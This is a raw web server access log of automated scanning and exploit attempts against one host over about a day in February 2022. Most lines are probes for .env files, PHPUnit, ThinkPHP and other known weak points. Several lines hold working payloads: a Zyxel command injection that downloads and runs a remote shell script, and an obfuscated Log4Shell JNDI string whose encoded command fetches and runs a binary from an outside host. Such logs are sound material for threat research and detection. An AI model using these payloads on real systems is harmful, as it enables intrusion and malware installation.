192.241.201.86 - - [13/Feb/2022:08:43:36 +0000] "GET /actuator/health HTTP/1.1" 404 388 "-" "Mozilla/5.0 zgrab/0.x"
80.82.77.192 - - [13/Feb/2022:11:29:35 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:11:32:12 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:11:32:14 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:11:38:31 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
31.210.20.81 - - [13/Feb/2022:11:57:36 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
31.210.20.81 - - [13/Feb/2022:11:57:37 +0000] "GET /adv,/cgi-bin/weblogin.cgi?username=admin%27%3Bcd%20/tmp%3Brm%20wget.sh;wget%20http%3A//136.144.41.151/multi/wget.sh%20-O-%20>s;chmod%20777%20s;sh%20s%20Exploit.Zyxel;+%23&password=asdf HTTP/1.1" 404 407 "-" "Mozila/5.0"
142.147.99.156 - - [13/Feb/2022:12:13:25 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:12:13:26 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:12:14:03 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:12:14:05 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
193.118.53.218 - - [13/Feb/2022:13:04:32 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
94.102.56.151 - - [13/Feb/2022:13:05:05 +0000] "GET / HTTP/1.1" 200 208 "-" "libwww-perl/6.45"
45.146.165.37 - - [13/Feb/2022:13:24:42 +0000] "GET /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:14:08:54 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:14:09:24 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:14:09:25 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:14:21:25 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:14:21:25 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:14:31:08 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:14:31:10 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:14:36:43 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:15:08:05 +0000] "GET /console/ HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:15:21:13 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:16:05:36 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:16:42:55 +0000] "GET / HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:16:45:34 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:16:45:35 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:16:50:34 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:16:50:36 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
190.14.33.188 - - [13/Feb/2022:17:13:41 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:17:28:15 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [13/Feb/2022:18:00:57 +0000] "GET / HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.118.53.194 - - [13/Feb/2022:18:48:27 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
20.55.53.144 - - [13/Feb/2022:19:13:01 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.117 Safari/537.36"
45.137.23.135 - - [13/Feb/2022:19:58:38 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 zgrab/0.x"
109.237.103.123 - - [13/Feb/2022:20:21:01 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:20:31:15 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:20:31:15 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.87.61.53 - - [13/Feb/2022:20:31:55 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.87.61.53 - - [13/Feb/2022:20:31:55 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:20:55:19 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:20:55:20 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:20:59:51 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
142.147.99.156 - - [13/Feb/2022:20:59:52 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
62.171.150.168 - - [13/Feb/2022:21:22:21 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
62.171.150.168 - - [13/Feb/2022:21:22:21 +0000] "POST /HNAP1/ HTTP/1.1" 404 444 "-" "Mozila/5.0"
185.142.236.41 - - [13/Feb/2022:21:40:43 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.142.236.41 - - [13/Feb/2022:21:40:43 +0000] "GET /robots.txt HTTP/1.1" 404 388 "-" "-"
185.142.236.41 - - [13/Feb/2022:21:40:43 +0000] "GET /sitemap.xml HTTP/1.1" 404 388 "-" "-"
185.142.236.41 - - [13/Feb/2022:21:40:48 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 388 "-" "-"
185.142.236.41 - - [13/Feb/2022:21:40:49 +0000] "GET /favicon.ico HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
185.165.190.17 - - [13/Feb/2022:22:23:34 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36"
185.165.190.17 - - [13/Feb/2022:22:23:35 +0000] "GET /robots.txt HTTP/1.1" 404 388 "-" "-"
185.165.190.17 - - [13/Feb/2022:22:23:35 +0000] "GET /sitemap.xml HTTP/1.1" 404 388 "-" "-"
185.165.190.17 - - [13/Feb/2022:22:23:35 +0000] "GET /.well-known/security.txt HTTP/1.1" 404 388 "-" "-"
185.165.190.17 - - [13/Feb/2022:22:23:35 +0000] "GET /favicon.ico HTTP/1.1" 404 444 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:80.0) Gecko/20100101 Firefox/80.0"
140.228.29.50 - - [13/Feb/2022:22:46:29 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
140.228.29.50 - - [13/Feb/2022:22:46:30 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
140.228.29.50 - - [13/Feb/2022:22:47:00 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
140.228.29.50 - - [13/Feb/2022:22:47:00 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:23:30:27 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [13/Feb/2022:23:30:29 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
154.89.5.80 - - [13/Feb/2022:23:39:08 +0000] "GET / HTTP/1.0" 200 208 "-" "-"
3.236.104.38 - - [14/Feb/2022:00:36:38 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.236.104.38 - - [14/Feb/2022:00:36:39 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.236.104.38 - - [14/Feb/2022:00:37:12 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
3.236.104.38 - - [14/Feb/2022:00:37:13 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
192.241.212.6 - - [14/Feb/2022:00:49:06 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 zgrab/0.x"
177.128.208.194 - - [14/Feb/2022:02:10:01 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
184.105.247.194 - - [14/Feb/2022:02:27:05 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
185.254.196.223 - - [14/Feb/2022:02:31:56 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:02:31:57 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "GET /nmaplowercheck1644809504 HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "POST /sdk HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "GET /server-status HTTP/1.1" 403 458 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "GET /sBQV HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "GET / HTTP/1.1" 200 208 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "POST /scripts/WPnBr.dll HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "GET /.git/HEAD HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "GET /Portal0000.htm HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:44 +0000] "GET /menu.jsa HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "GET /pools/default/buckets HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "GET /HNAP1 HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "GET /CSS/Miniweb.css HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "GET / HTTP/1.1" 200 208 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "GET /__Additional HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "GET /pools HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "GET /favicon.ico HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "GET / HTTP/1.1" 200 208 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:45 +0000] "HEAD / HTTP/1.1" 200 167 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:46 +0000] "GET /docs/cplugError.html/ HTTP/1.1" 404 407 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:46 +0000] "GET / HTTP/1.1" 200 208 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:46 +0000] "GET /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000 HTTP/1.1" 200 208 "-" "curl/7.54.0"
172.104.140.107 - - [14/Feb/2022:03:31:55 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
190.63.3.49 - - [14/Feb/2022:04:44:48 +0000] "GET / HTTP/1.1" 200 189 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
162.221.192.26 - - [14/Feb/2022:04:58:18 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
162.221.192.26 - - [14/Feb/2022:04:58:18 +0000] "GET /webfig/ HTTP/1.1" 404 388 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
109.237.103.9 - - [14/Feb/2022:05:19:00 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:05:31:45 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:05:31:47 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
107.189.10.196 - - [14/Feb/2022:05:34:45 +0000] "GET / HTTP/1.1" 200 189 "-" "-"
107.189.10.196 - - [14/Feb/2022:05:34:45 +0000] "POST /HNAP1/ HTTP/1.1" 404 444 "-" "Mozila/5.0"
130.211.54.158 - - [14/Feb/2022:06:11:39 +0000] "GET / HTTP/1.1" 200 319 "-" "python-requests/2.27.1"
144.22.197.146 - - [14/Feb/2022:07:09:42 +0000] "GET / HTTP/1.1" 200 208 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}')"
20.24.42.8 - - [14/Feb/2022:07:47:01 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.24.42.8 - - [14/Feb/2022:07:47:03 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:08:11:37 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
128.14.136.18 - - [14/Feb/2022:08:15:22 +0000] "GET / HTTP/1.1" 200 263 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:08:31:00 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:08:31:02 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:08:35:26 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.143.144.187 - - [14/Feb/2022:08:53:47 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.143.144.187 - - [14/Feb/2022:08:53:47 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:09:29:01 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
193.118.53.210 - - [14/Feb/2022:09:38:30 +0000] "GET /solr/ HTTP/1.1" 404 388 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
20.97.246.144 - - [14/Feb/2022:09:53:47 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.97.246.144 - - [14/Feb/2022:09:53:47 +0000] "GET /core/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.97.246.144 - - [14/Feb/2022:09:53:48 +0000] "GET /app/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.97.246.144 - - [14/Feb/2022:09:53:48 +0000] "GET /public/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.97.246.144 - - [14/Feb/2022:09:53:48 +0000] "GET /opt/env/.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
20.97.246.144 - - [14/Feb/2022:09:53:48 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:10:18:10 +0000] "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
144.22.197.146 - - [14/Feb/2022:10:40:55 +0000] "GET / HTTP/1.1" 200 208 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//150.136.111.68:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTU4LjEwMS4xMTguMjM2L2Rldl9zc2hkOyBjdXJsIC1PIGh0dHA6Ly8xNTguMTAxLjExOC4yMzYvZGV2X3NzaGQ7IGNobW9kIDc3NyBkZXZfc3NoZDsgLi9kZXZfc3NoZCBleHBsb2l0Lng4Ng==}')"
45.146.165.37 - - [14/Feb/2022:10:42:27 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 282 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:11:23:38 +0000] "GET /console/ HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:11:31:11 +0000] "GET /.env HTTP/1.1" 404 444 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
185.254.196.223 - - [14/Feb/2022:11:31:12 +0000] "POST / HTTP/1.1" 405 426 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:12:16:15 +0000] "POST /Autodiscover/Autodiscover.xml HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
45.146.165.37 - - [14/Feb/2022:12:31:47 +0000] "GET /_ignition/execute-solution HTTP/1.1" 404 407 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
